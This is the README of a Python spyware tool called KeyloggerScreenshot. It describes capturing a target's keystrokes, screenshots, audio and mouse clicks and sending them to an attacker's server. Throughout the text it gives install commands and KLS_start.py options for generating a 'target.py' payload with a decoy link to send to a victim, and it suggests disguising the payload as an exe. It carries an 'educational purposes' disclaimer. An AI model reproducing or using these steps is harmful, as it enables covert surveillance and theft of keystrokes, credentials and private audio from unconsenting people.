KeyloggerScreenshot
===================


The Keylogger allows the attacker to get all the information the target was typing and taking screenshot of specific minutes which is being calculated in the script and all the audio of the target was speaking will be stored where your server is located. Every mouse click will be represented at the server via simulation. Follow the instructions to build your own server in "KeyloggerScreenshot"

check out my pypi page:
https://pypi.org/project/KeyloggerScreenshot/

I would suggest to run KeyloggerScreenshot on Kali linux. But it works on every linux distro (also Windows)

If you are a Linux user. Change to root.

To change root write:

`sudo su`

In your terminal

To clone KeyloggerScreenshot simply type:

`git clone https://github.com/Kill0geR/KeyloggerScreenshot.git`

In your terminal

Continue by writing: 

`cd KeyloggerScreenshot`

Install all requirements:

`python requirements.py`

If there is any problem with the server than check out the other method on:

https://pypi.org/project/KeyloggerScreenshot/

HOW DOES KeyloggerScreenshot WORK?
==================================

Write your IP-Address in KLS_start.py
`python KLS_start.py -aip 127.0.0.1`

To create a file: 
`python KLS_start.py -aip 127.0.0.1 -cf`

You can send the created file to your target

You can also specify the filename simply write the filename after -cf
`python KLS_start.py -aip 127.0.0.1 -cf test.py`

To create a server with the same ports as the target
`python KLS_start.py -aip 127.0.0.1 -cf -ds`

To see all the ports:
`python KLS_start.py -aip 127.0.0.1 -cf -ds -p`

To activate simulation (every mousclick of the target will be displayed):
`python KLS_start.py -aip 127.0.0.1 -cf -ds -p -sim`

The standard filename is target.py

You can also specify the seconds which is going to be run at the target

`python KLS_start.py -aip 127.0.0.1 -cf test.py -s 120 -sim`

The default seconds is 60

To specify a link that will be opend when executed. Use:

`python KLS_start.py -aip 127.0.0.1 -cf test.py -s 120 -phs https://www.google.com -sim`


After running the code you can send the created filename

After the specified seconds your directory will look like this:

Additional
==========
* You can send "target.py" as an exe file to the target with "auto-py-to-exe"

* KeyloggerScreenshot is very easy to use.

* The servers can be used on any OS. The client should be a Windows OS

* DO NOT USE THIS TO ATTACK SOMEONE FOREIGN. I BUILD IT FOR EDUCATIONAL PURPOSES.

* Simulation_code.py won't work properly on Virtual Machine

* Server will shutdown automatically after everything has been sent to the server.

* Timer can't be removed (THIS WAS BUILT FOR EDUCATIONAL PURPOSES. THAT'S WHY THERE IS A TIMER SO NOBODY CAN ABUSE THE KEYLOGGER)
